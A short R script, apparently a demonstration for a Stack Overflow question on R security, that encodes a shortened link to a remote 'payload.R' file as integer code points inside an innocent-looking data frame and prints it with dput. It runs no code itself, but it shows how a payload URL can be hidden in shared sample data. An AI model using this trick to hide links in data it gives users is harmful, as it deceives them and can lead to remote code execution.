main_url  <- "https://raw.githubusercontent.com/samrickman/stack-overflow-r-security-question/master/payload.R"
short_url  <- "https://t.ly/QPDY"

x <- utf8ToInt(short_url)
set.seed(999)
text_df <- data.frame(
    source = rep_len(c("facebook", "twitter", "youtube"), length(x)),
    word = paste0("word", seq_along(x)),
    x = x,
    y = as.integer(x * rnorm(length(x)))
)
attr(text_df$word, "encoding") <- "intToUtf8"
dput(text_df)
